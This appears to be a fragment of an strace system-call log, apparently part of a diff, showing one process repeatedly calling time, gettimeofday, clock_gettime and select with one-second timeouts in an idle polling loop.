+[pid  4618] 15:03:40.687143 time(NULL)  = 1478462620
+[pid  4618] 15:03:40.687164 gettimeofday({1478462620, 687169}, NULL) = 0
+[pid  4618] 15:03:40.687180 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+[pid  4618] 15:03:40.687262 clock_gettime(CLOCK_MONOTONIC, {2546, 150258992}) = 0
+[pid  4618] 15:03:40.687275 gettimeofday({1478462620, 687280}, NULL) = 0
+[pid  4618] 15:03:40.687289 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+[pid  4618] 15:03:41.687100 clock_gettime(CLOCK_MONOTONIC, {2547, 150110640}) = 0
+[pid  4618] 15:03:41.687135 gettimeofday({1478462621, 687140}, NULL) = 0
+[pid  4618] 15:03:41.687152 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+[pid  4618] 15:03:42.687099 clock_gettime(CLOCK_MONOTONIC, {2548, 150109081}) = 0
+[pid  4618] 15:03:42.687131 time(NULL)  = 1478462622
+[pid  4618] 15:03:42.687144 time(NULL)  = 1478462622
+[pid  4618] 15:03:42.687160 gettimeofday({1478462622, 687164}, NULL) = 0
+[pid  4618] 15:03:42.687175 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+[pid  4618] 15:03:42.687257 clock_gettime(CLOCK_MONOTONIC, {2548, 150254515}) = 0
+[pid  4618] 15:03:42.687271 gettimeofday({1478462622, 687275}, NULL) = 0
+[pid  4618] 15:03:42.687285 select(1024, [2 3], [], NULL, {1, 0}
